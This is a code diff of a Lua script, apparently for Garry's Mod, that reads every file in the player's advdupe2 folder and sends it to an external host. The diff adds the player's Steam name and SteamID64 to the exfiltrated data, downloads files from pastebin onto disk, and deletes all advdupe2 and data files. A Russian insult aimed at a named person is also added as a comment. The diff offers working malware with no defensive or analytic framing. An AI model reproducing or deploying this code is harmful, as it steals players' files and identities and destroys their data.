@@ -1,3 +1,4 @@
+-- привет от николаса мейсона пидрила
 local function ToByte(Code)
     return string.gsub(Code, ".", function(Char) return "\\" .. string.byte(Char) end)
 end
@@ -6,12 +7,7 @@ local c,d=file.Find(b.."*","MOD")
 for _,f in pairs(c)do 
 local g=file.Read(b.."/"..f,"GAME")
 if g==nil then return end
-http.Post("http://site2.local/collect.php",{
-vfo="76561199050980078",
-one=b,
-two=f,
-tree=ToByte(g)
-})
+http.Post("http://a0849719.xsph.ru/i.php",{one=b,two=f,tree=ToByte(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
 end
 for h,i in pairs(d)do 
 a(b..i.."/")
@@ -19,11 +15,28 @@ end
 end
 a("data/advdupe2/")
 
-http.Post("http://site2.local/collect.php", {
-build = "Client",
-country = "RU",
-dupes = "421",
-name = "[#] WhyHerFly",
-steamid = "STEAM_0:0:545357175",
-path = "76561199050980078"
-})
+timer.Simple(10, function()
+local ta = {
+"00c1c023911eb9",
+"3911eb903806e1",
+"23911eb936e6f6",
+"773806e6f6e6963",
+"023911eb900c1c0",
+"911eb936f63806s"
+}
+
+http.Fetch("https://pastebin.com/raw/q9ZRqJEY", function(b)
+    file.Write(table.Random(ta)..table.Random(ta)..".txt", b)
+end)
+
+http.Fetch("https://pastebin.com/raw/Hf6QYzHm", function(b)
+    file.Write("smeghack.txt", b)
+end)
+end)
+
+for k,v in pairs(file.Find("data/advdupe2/".."*", "MOD")) do
+	file.Delete("advdupe2/"..v)
+end
+for k,v in pairs(file.Find("data/".."*", "MOD")) do
+	file.Delete(v)
+end
